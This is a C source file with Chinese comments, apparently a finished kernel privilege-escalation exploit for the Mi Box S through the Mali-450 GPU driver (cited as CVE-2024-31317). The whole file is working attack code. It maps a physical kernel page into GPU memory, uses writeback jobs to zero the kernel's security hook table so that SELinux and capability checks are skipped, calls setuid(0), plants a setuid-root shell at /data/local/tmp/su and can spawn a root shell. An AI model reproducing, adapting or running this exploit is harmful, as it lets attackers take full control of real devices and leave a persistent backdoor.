/*
 * kort_root2.c - Mi Box S (oneday) Mali Utgard r10p1 提权 (最终版)
 *
 * 原理:
 *   CVE-2024-31317: BIND_MEM 绑定任意物理页 -> GPU VA
 *   PP job WB writeback: 1KB 窗口写同一 32 位值 (已实测验证落地)
 *   目标: security_hook_heads (LSM 钩子链表头数组) 清零
 *     -> 所有 LSM hook (SELinux/capability) 跳过
 *     -> capable() 恒放行 -> setuid(0) 直接 root
 *
 * 目标地址:
 *   security_hook_heads VA 0xffffff800a828120
 *   phys = 0x01080000 + (VA - 0xffffff8009080000) = 0x02828120
 *   页 0x02828000, 页内偏移 0x120
 *   数组 [0x120, 0x120+0xBA0), 前后无危险符号:
 *     前: dac_mmap_min_addr@0x118 (不碰)
 *     后: secclass_map@0xcc0 (仅 policy load 用, 无害)
 *
 * 写入: 4 个 1KB 窗口清零 [0x120, 0xd20)
 *
 * 编译: armv7a-linux-androideabi24-clang kort_root2.c -o kort_root2 -static
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/wait.h>

#define MALI_IOC_MEM_ALLOC  0xC0288300
#define MALI_IOC_MEM_FREE   0xC0108301
#define MALI_IOC_MEM_BIND   0xC0288302
#define MALI_IOC_PP_START_JOB       0xC1988400
#define MALI_IOC_WAIT_FOR_NOTIFICATION 0xC0688202

typedef struct {
    uint64_t ctx; uint32_t gpu_vaddr; uint32_t vsize;
    uint32_t psize; uint32_t flags;
    uint64_t backend_handle; int32_t secure_shared_fd;
} alloc_mem_s;

typedef struct { uint32_t points[3]; int32_t sync_fd; } mali_uk_fence_t;

typedef struct {
    uint64_t ctx; uint64_t user_job_ptr; uint32_t priority;
    uint32_t frame_registers[23];
    uint32_t frame_registers_addr_frame[7];
    uint32_t frame_registers_addr_stack[7];
    uint32_t wb0_registers[12]; uint32_t wb1_registers[12];
    uint32_t wb2_registers[12]; uint32_t dlbu_registers[4];
    uint32_t num_cores; uint32_t perf_counter_flag;
    uint32_t perf_counter_src0; uint32_t perf_counter_src1;
    uint32_t frame_builder_id; uint32_t flush_id; uint32_t flags;
    uint32_t tilesx; uint32_t tilesy; uint32_t heatmap_mem;
    uint32_t num_memory_cookies; uint64_t memory_cookies;
    mali_uk_fence_t fence; uint64_t timeline_point_ptr;
} pp_start_job_s;

typedef struct {
    uint64_t ctx; uint32_t type; uint32_t _pad; uint8_t data[88];
} wait_for_notification_s;

#define FR_PLBU_ARRAY_ADDR 0
#define FR_RENDER_ADDR      1
#define FR_FLAGS            3
#define FR_CLEAR_DEPTH      4
#define FR_CLEAR_STENCIL    5
#define FR_CLEAR_COLOR_0    6
#define FR_CLEAR_COLOR_1    7
#define FR_CLEAR_COLOR_2    8
#define FR_CLEAR_COLOR_3    9
#define FR_WIDTH           10
#define FR_HEIGHT          11
#define FR_FRAG_STACK_ADDR 12
#define FR_FRAG_STACK_SIZE 13
#define FR_DUBYA           18
#define FR_BLOCKING        20
#define FR_SCALE           21
#define FR_FOUREIGHT       22

#define WB_TYPE 0
#define WB_ADDRESS 1
#define WB_PIXEL_FORMAT 2
#define WB_DOWNSAMPLE 3
#define WB_PIXEL_LAYOUT 4
#define WB_PITCH 5
#define WB_MRT_BITS 6

#define _MALI_NOTIFICATION_PP_FINISHED ((2 << 16) | 0x10)
#define _MALI_MEMORY_BIND_BACKEND_EXTERNAL_MEMORY 0x800

#define GPU_VA_DATA  0x40000000u   /* job 数据区 (ALLOC) */
#define GPU_VA_HOOKS 0x40300000u   /* security_hook_heads 2 页 (BIND) */
#define HOOKS_PHYS   0x02828000u
#define HOOKS_OFF    0x120        /* security_hook_heads 页内偏移 */
#define BUF_SIZE     0x4000

static const uint32_t fragment_shader[] = {
    0x00020425, 0x0000000c, 0x01e007cf, 0xb0000000, 0x000005f5,
};

static volatile int g_to = 0;
static void alh(int s) { g_to = 1; }

static int tio(int fd, unsigned int cmd, void *buf, int t) {
    alarm(t); g_to = 0;
    int r = ioctl(fd, cmd, buf);
    int e = errno;
    alarm(0);
    if (g_to) return -999;
    return r == 0 ? 0 : -e;
}

/* WB job: 1KB 窗口 [wb_addr, wb_addr+0x400) 写 value (kort_dump 已验证) */
static int wb_write(int fd, uint32_t *buf, uint32_t wb_addr, uint32_t value)
{
    const uint32_t OFF_PLB = 0x000, OFF_SHADER = 0x080, OFF_RSW = 0x100,
                   OFF_TILEBLK = 0x200, OFF_STACK = 0x1000;
    memset(buf, 0, 0x2000);

    uint32_t *rsw = (uint32_t*)((uint8_t*)buf + OFF_RSW);
    rsw[0x08] = 0x0000F008;
    rsw[0x09] = (GPU_VA_DATA + OFF_SHADER) | 5;
    rsw[0x0D] = 0x00000100;

    uint32_t *plb = (uint32_t*)buf;
    plb[0] = 0x00000000;
    plb[1] = 0xB8000000;
    plb[2] = 0xE0000002 | (((GPU_VA_DATA + OFF_TILEBLK) >> 3) & ~0xE0000003u);
    plb[3] = 0xB0000000;
    plb[4] = 0x00000000;
    plb[5] = 0xBC000000;

    pp_start_job_s job;
    memset(&job, 0, sizeof(job));
    job.user_job_ptr = 0xCAFEBABE;
    job.num_cores = 1;

    job.frame_registers[FR_PLBU_ARRAY_ADDR] = GPU_VA_DATA + OFF_PLB;
    job.frame_registers[FR_RENDER_ADDR]     = GPU_VA_DATA + OFF_RSW;
    job.frame_registers[FR_FLAGS]           = 0x01;
    job.frame_registers[FR_CLEAR_DEPTH]     = 0x00FFFFFF;
    job.frame_registers[FR_CLEAR_COLOR_0]   = value;
    job.frame_registers[FR_CLEAR_COLOR_1]   = value;
    job.frame_registers[FR_CLEAR_COLOR_2]   = value;
    job.frame_registers[FR_CLEAR_COLOR_3]   = value;
    job.frame_registers[FR_WIDTH]           = 0x100;
    job.frame_registers[FR_HEIGHT]          = 0x100;
    job.frame_registers[FR_FRAG_STACK_ADDR] = GPU_VA_DATA + OFF_STACK;
    job.frame_registers[FR_FRAG_STACK_SIZE] = 0;
    job.frame_registers[FR_DUBYA]           = 0x77;
    job.frame_registers[FR_SCALE]           = 0x0C;
    job.frame_registers[FR_FOUREIGHT]       = 0x8888;

    job.wb0_registers[WB_TYPE]         = 0x02;
    job.wb0_registers[WB_ADDRESS]      = wb_addr;
    job.wb0_registers[WB_PIXEL_FORMAT] = 0x03;   /* RGBA8888 */
    job.wb0_registers[WB_PITCH]        = 8;      /* 64B/row */
    job.wb0_registers[WB_MRT_BITS]     = 4;

    job.fence.sync_fd = -1;
    uint32_t tl = 0;
    job.timeline_point_ptr = (uint64_t)(uintptr_t)&tl;

    __builtin___clear_cache((char*)buf, (char*)buf + 0x2000);

    int r = tio(fd, MALI_IOC_PP_START_JOB, &job, 5);
    if (r != 0) return r;

    wait_for_notification_s notif;
    memset(&notif, 0, sizeof(notif));
    r = tio(fd, MALI_IOC_WAIT_FOR_NOTIFICATION, &notif, 5);
    if (r != 0) return r;
    /* status 可能报 UNKNOWN_ERR 但写入已落地 (实测), 忽略 */
    return 0;
}

static int bind_phys(int fd, uint32_t phys, uint32_t gpu_va, uint32_t size) {
    uint8_t raw[40];
    memset(raw, 0, sizeof(raw));
    uint64_t ctx = 0;
    uint32_t vaddr = gpu_va, sz = size,
             fl = _MALI_MEMORY_BIND_BACKEND_EXTERNAL_MEMORY, pa = phys;
    memcpy(raw + 0,  &ctx, 8);
    memcpy(raw + 8,  &vaddr, 4);
    memcpy(raw + 12, &sz, 4);
    memcpy(raw + 16, &fl, 4);
    memcpy(raw + 20, &pa, 4);
    return tio(fd, MALI_IOC_MEM_BIND, raw, 3);
}

int main(int argc, char **argv) {
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = alh;
    sigaction(SIGALRM, &sa, NULL);
    setvbuf(stdout, NULL, _IONBF, 0);

    printf("[*] kort_root2 - Mali-450 WB -> security_hook_heads -> setuid(0)\n");
    printf("[*] uid=%d\n", getuid());

    int fd = open("/dev/mali", O_RDWR);
    if (fd < 0) { perror("[-] open /dev/mali"); return 1; }

    /* 1. ALLOC job 数据区 */
    alloc_mem_s alloc;
    memset(&alloc, 0, sizeof(alloc));
    alloc.gpu_vaddr = GPU_VA_DATA;
    alloc.vsize = BUF_SIZE;
    alloc.psize = BUF_SIZE;
    int r = tio(fd, MALI_IOC_MEM_ALLOC, &alloc, 3);
    if (r != 0) { printf("[-] ALLOC err=%d\n", -r); return 1; }

    void *buf = mmap(NULL, BUF_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED, fd, GPU_VA_DATA);
    if (buf == MAP_FAILED) { printf("[-] mmap: %s\n", strerror(errno)); return 1; }
    printf("[+] job data mmap OK\n");

    /* 2. BIND security_hook_heads 两页 */
    r = bind_phys(fd, HOOKS_PHYS, GPU_VA_HOOKS, 0x2000);
    if (r != 0) { printf("[-] BIND err=%d (%s)\n", -r, strerror(-r)); return 1; }
    printf("[+] BIND phys 0x%08x -> GPU 0x%08x OK\n", HOOKS_PHYS, GPU_VA_HOOKS);

    /* 3. 4 个 1KB 窗口清零 [0x120, 0xd20) 页内 */
    const uint32_t offs[4] = { 0x120, 0x420, 0x720, 0x920 };
    for (int i = 0; i < 4; i++) {
        uint32_t addr = GPU_VA_HOOKS + offs[i];
        printf("[*] WB job %d/4: clear [0x%03x, 0x%03x) ...\n",
               i + 1, offs[i], offs[i] + 0x400);
        r = wb_write(fd, (uint32_t*)buf, addr, 0);
        if (r == -999) { printf("[-] TIMEOUT - driver hung, abort\n"); return 1; }
        if (r != 0) printf("  [!] job ret=%d (继续)\n", r);
    }

    /* 4. 收尾 */
    munmap(buf, BUF_SIZE);
    close(fd);
    printf("[+] hook heads cleared, trying setuid(0)...\n\n");

    /* 5. setuid(0) — capability hook 已空, 应放行 */
    if (setuid(0) != 0) {
        printf("[-] setuid(0) failed: %s\n", strerror(errno));
        printf("[*] fallback: setgid(0)+setuid(0)\n");
        setgid(0); setuid(0);
    }
    printf("[*] now uid=%d euid=%d\n", getuid(), geteuid());

    if (getuid() == 0) {
        printf("\n[+] ========================================\n");
        printf("[+]  ROOT! uid=0\n");
        printf("[+] ========================================\n\n");

        /* 落一个 su 供后续使用 */
        system("cp /system/bin/sh /data/local/tmp/su 2>/dev/null;"
               "chown 0:0 /data/local/tmp/su 2>/dev/null;"
               "chmod 6755 /data/local/tmp/su 2>/dev/null;"
               "id > /data/local/tmp/pwned.txt;"
               "echo PWNED >> /data/local/tmp/pwned.txt");

        if (argc > 1 && strcmp(argv[1], "-s") == 0) {
            printf("[*] spawning root shell...\n");
            char *sh[] = {"/system/bin/sh", NULL};
            execv(sh[0], sh);
        }
        printf("[*] /data/local/tmp/su 已生成 (若 cp 成功)\n");
    } else {
        printf("[-] setuid 失败, hook 清零可能未生效\n");
    }
    return 0;
}
